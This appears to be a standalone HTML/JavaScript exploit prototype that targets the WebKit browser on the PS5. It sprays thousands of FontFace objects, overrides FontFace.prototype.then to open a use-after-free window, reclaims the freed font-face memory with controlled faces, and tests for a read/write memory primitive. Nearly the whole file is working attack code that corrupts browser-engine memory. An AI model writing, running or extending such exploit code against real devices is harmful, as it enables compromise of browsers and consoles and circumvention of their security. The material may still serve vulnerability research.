<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v15 - Simple Capture</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#000;color:#0f0;
font-family:monospace;overflow:hidden}
#out{position:fixed;top:0;left:0;right:0;bottom:0;
padding:16px;font-size:16px;line-height:1.6;
overflow-y:auto;-webkit-user-select:text}
.c{color:#0f0}.e{color:#f44}.w{color:#fc0}.h{color:#0ff;font-weight:bold}
.s{color:#f0f;font-weight:bold;font-size:18px}.d{color:#666}
#c{position:absolute;left:-9999px;top:-9999px}
</style>
</head>
<body>
<div id="out"></div>
<canvas id="c" width="512" height="128"></canvas>
<script>
"use strict";

// ============================================================
//  PS5 WebKit v15 - SIMPLE CAPTURE
//  Focus: Capture RC face from initial load(), test primitives
//  Be VERY careful not to crash
// ============================================================

const O=document.getElementById("out");
function P(m,c){const s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
function Ok(m){P("✅ "+m,"c")}function Fl(m){P("✘ "+m,"e")}
function Wr(m){P("⚠ "+m,"w")}function Hi(m){P("► "+m,"h")}
function St(m){P("★ "+m+" ★","s")}function Dm(m){P(m,"d")}

window.onerror=function(m,s,l){Fl("ERR: "+m+" @"+l);return true};

let keepAlive=[],holeFaces=[],reclaimFaces=[];
let triggerFace=null,uafFired=false;

const FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
const FBb=(()=>{const s=atob(FB),b=new Uint8Array(s.length);
for(let i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){const c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

// ============================================================
//  PHASE 1: Setup
// ============================================================
Dm("Creating holes...");
for(let i=0;i<4096;i++){
try{const f=new FontFace("h_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),
style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)});
document.fonts.add(f);holeFaces.push(f)}catch(e){}}
fs();
for(let i=1;i<holeFaces.length;i+=2)
try{document.fonts.delete(holeFaces[i])}catch(e){}
fs();
Ok("Holes ready");

Dm("Setting up trigger...");
triggerFace=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(triggerFace);void triggerFace.loaded;

// Add pads
const sh=document.getElementById("s").sheet;
for(let i=0;i<48;i++)
try{sh.insertRule(`@font-face{font-family:pad${i};src:url(np${i}.woff);unicode-range:U+E000}`,sh.cssRules.length)}catch(e){}
fs();

// Add flush
const fst=document.createElement("style");fst.id="flush";
document.head.appendChild(fst);
const fsh=fst.sheet;
for(let i=0;i<768;i++)
try{fsh.insertRule(`@font-face{font-family:fl${i};src:url(nf${i}.woff);unicode-range:U+E000}`,fsh.cssRules.length)}catch(e){}
fs();
Ok("Trigger ready");

// ============================================================
//  PHASE 2: UAF Trigger
// ============================================================
Object.defineProperty(FontFace.prototype,"then",{
configurable:true,
get(){
if(this===triggerFace&&!uafFired){
uafFired=true;
St("UAF WINDOW OPEN");

try{
// Kill cache
const ck=new FontFace("ck"+keepAlive.length,"local(Helvetica)",{unicodeRange:"U+E124"});
document.fonts.add(ck);keepAlive.push(ck);

// Delete the 'x' font-face rule (frees CSSFontFace for 'x')
sh.deleteRule(1);
fs();

// Delete flush rules
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();

// Delete some holes
for(let i=0;i<holeFaces.length;i+=4)
try{document.fonts.delete(holeFaces[i])}catch(e){}
fs();
}catch(e){Fl("UAF prep: "+e.message)}

// Spray RC faces
Dm("Spraying RC faces...");
for(let i=0;i<4096;i++){
try{const f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
document.fonts.add(f);reclaimFaces.push(f)}catch(e){}
}
fs();
Ok("Spray done");

// Force layout with trigger font
try{
const d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth;
}catch(e){}

Dm("UAF window closing");
}
return undefined;
}
});

// ============================================================
//  PHASE 3: Load and Capture
//  The initial load() call returns the RC face
//  We capture it in the .then() callback
// ============================================================
Dm("Firing load()...");

document.fonts.load("1em trigger, x","AB").then(function(faces){
St("LOAD CALLBACK FIRED");
P("Faces returned: "+faces.length,"h");

let rcFace=null,rcIdx=-1,trigFace=null;

for(let i=0;i<faces.length;i++){
const f=faces[i];
P("  ["+i+"] "+f.family+" | "+f.style+" | "+f.weight+" | st="+f.status);

if(f.family&&f.family.startsWith("RC_")){
rcFace=f;
const m=f.family.match(/RC_(\d+)/);
if(m)rcIdx=parseInt(m[1]);
}
if(f.family==="trigger")trigFace=f;
}

// Keep references alive
keepAlive.push(faces);
keepAlive.push(rcFace);
keepAlive.push(trigFace);

if(rcFace){
St("CAPTURED RC_"+rcIdx);

// ============================================================
//  PHASE 4: Property Analysis
// ============================================================
P("");
Hi("=== PROPERTY ANALYSIS ===");

const props=["family","style","weight","stretch","unicodeRange",
"variant","featureSettings","display","status","loaded"];

for(const p of props){
try{
const v=rcFace[p];
const t=typeof v;
if(t==="object"&&v!==null){
P("  "+p.padEnd(16)+"= [object] ("+v.constructor.name+")","h");
}else{
P("  "+p.padEnd(16)+"= "+v);
}
}catch(e){
P("  "+p.padEnd(16)+"= ERR: "+e.message,"e");
}
}

// ============================================================
//  PHASE 5: Identity Test
//  Is the rcFace the SAME JS object as the one in reclaimFaces?
// ============================================================
P("");
Hi("=== IDENTITY TEST ===");

const sameObj=reclaimFaces[rcIdx]===rcFace;
P("rcFace === reclaimFaces["+rcIdx+"]: "+sameObj,sameObj?"c":"h");

if(!sameObj){
Hi("DIFFERENT JS OBJECTS!");
Hi("The load() returned a DIFFERENT wrapper");
Hi("This means the C++ object was reused!");
}

// Check if it's in document.fonts
let foundInFonts=false;
try{
for(const f of document.fonts){
if(f===rcFace){foundInFonts=true;break}
}
}catch(e){}
P("Found in document.fonts: "+foundInFonts);

// ============================================================
//  PHASE 6: Write-Through Test
// ============================================================
P("");
Hi("=== WRITE-THROUGH TEST ===");

// Try modifying rcFace and checking if trigFace sees it
if(trigFace){
P("Testing: modify rcFace, read trigFace...","d");

const origWeight=rcFace.weight;
try{
rcFace.weight="100";
fs();
const trigWeight=trigFace.weight;
P("  rcFace.weight→100, trigFace.weight="+trigWeight,
trigWeight==="100"?"h":"d");
if(trigWeight==="100")St("WRITE-THROUGH VIA WEIGHT!");
rcFace.weight=origWeight;fs();
}catch(e){P("  weight: "+e.message,"e")}

const origStyle=rcFace.style;
try{
rcFace.style="normal";
fs();
const trigStyle=trigFace.style;
P("  rcFace.style→normal, trigFace.style="+trigStyle,
trigStyle==="normal"?"h":"d");
if(trigStyle==="normal")St("WRITE-THROUGH VIA STYLE!");
rcFace.style=origStyle;fs();
}catch(e){P("  style: "+e.message,"e")}

const origDisplay=rcFace.display;
try{
rcFace.display="fallback";
fs();
const trigDisplay=trigFace.display;
P("  rcFace.display→fallback, trigFace.display="+trigDisplay,
trigDisplay==="fallback"?"h":"d");
rcFace.display=origDisplay;fs();
}catch(e){P("  display: "+e.message,"e")}
}

// ============================================================
//  PHASE 7: Delete + Replace Test
// ============================================================
P("");
Hi("=== DELETE + REPLACE TEST ===");

try{
// Delete the confused RC face
document.fonts.delete(rcFace);
fs();
Ok("Deleted RC_"+rcIdx);

// Try load() again
document.fonts.load("1em trigger, x","AB").then(function(f2){
P("After delete: load() returned "+f2.length+" faces","h");
for(const f of f2){
P("  "+f.family+" "+f.style+" "+f.weight+" st="+f.status);
}

// Check if a different face appears
const newRC=f2.find(function(f){return f.family&&f.family.startsWith("RC_")});
if(newRC){
Hi("New RC face: "+newRC.family);
Hi("This means the slot was reoccupied!");
keepAlive.push(newRC);
}else{
Dm("No RC face after delete");
}

// Spray replacement
P("");
Dm("Spraying REPL faces...");
const repls=[];
for(let i=0;i<1024;i++){
try{const f=new FontFace("REPL_"+i,mkBuf(),{
unicodeRange:"U+0041",
style:i%2===0?"normal":"italic",
weight:String([100,400,700,900][i%4])});
document.fonts.add(f);repls.push(f)}catch(e){}
}
fs();

// Check load() again
document.fonts.load("1em trigger, x","AB").then(function(f3){
P("After REPL spray: load() returned "+f3.length+" faces","h");
for(const f of f3){
P("  "+f.family+" "+f.style+" "+f.weight+" st="+f.status,
f.family&&f.family.startsWith("REPL_")?"h":"d");
}

const repl=f3.find(function(f){return f.family&&f.family.startsWith("REPL_")});
if(repl){
St("REPL FACE FOUND: "+repl.family);
Hi("  style: "+repl.style);
Hi("  weight: "+repl.weight);

// Find the JS reference
const replRef=repls.find(function(r){return r.family===repl.family});
if(replRef){
Ok("Found JS ref for "+replRef.family);

// Test write-through on REPL
try{
replRef.weight="300";fs();
const chk=document.fonts.load("1em trigger, x","AB");
chk.then(function(f4){
const chkR=f4.find(function(f){return f.family===repl.family});
if(chkR){
P("Write weight→300: load returns "+chkR.weight,
chkR.weight==="300"?"h":"d");
if(chkR.weight==="300")St("REPL WRITE-THROUGH CONFIRMED!");
}
replRef.weight="900";fs();

// ============================================================
//  FINAL SUMMARY
// ============================================================
P("");
St("=== FINAL SUMMARY ===");
P("UAF:              ✅");
P("RC captured:      RC_"+rcIdx);
P("REPL found:       "+repl.family);
P("Write-through:    "+(chkR&&chkR.weight==="300"?"✅":"⏳"));
P("");
P("Primitive path:","h");
P("1. Delete RC face from document.fonts","d");
P("2. Spray REPL faces with controlled props","d");
P("3. load() returns the REPL face","d");
P("4. Modify REPL face → load() sees change","d");
P("5. This IS a read/write primitive!","h");
});
}catch(e){Fl("Write test: "+e.message)}
}
}else{
Wr("No REPL face found");
Dm("Need different spray strategy");
}

// Cleanup REPLs
for(const r of repls)try{document.fonts.delete(r)}catch(e){}
fs();

}).catch(function(e){Fl("Load after REPL: "+e.message)});

}).catch(function(e){Fl("Load after delete: "+e.message)});

}catch(e){Fl("Delete test: "+e.message)}

}else{
Wr("No RC face in load result");
P("");
Dm("Trying alternative: check resolved faces array");

// List what we got
for(const f of faces){
P("  Got: "+f.family+" "+f.style+" "+f.weight+" st="+f.status);
}

// Try load with different specs
P("");
Dm("Trying different load specs...");
const specs=["1em x","64px x","900 italic 64px x","1em trigger"];
for(const sp of specs){
document.fonts.load(sp,"AB").then(function(r){
P("  load('"+sp+"','AB') → "+r.length+" faces");
for(const f of r)P("    "+f.family);
}).catch(function(e){P("  load('"+sp+"') ERR","e")});
}
}

}).catch(function(err){
Fl("Initial load failed: "+err);
});

// RAF fallback for UAF
let rn=0;
const raf=function(){
rn++;
if(!uafFired&&rn>=5){
try{
const ck=new FontFace("ck2","local(Helvetica)",{unicodeRange:"U+E125"});
document.fonts.add(ck);keepAlive.push(ck);
if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();
for(let i=0;i<4096;i++){
try{const f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900"});
document.fonts.add(f);reclaimFaces.push(f)}catch(e){}
}
fs();
}catch(e){}
}
if(rn<20)requestAnimationFrame(raf);
};
requestAnimationFrame(raf);
</script>
</body>
</html>
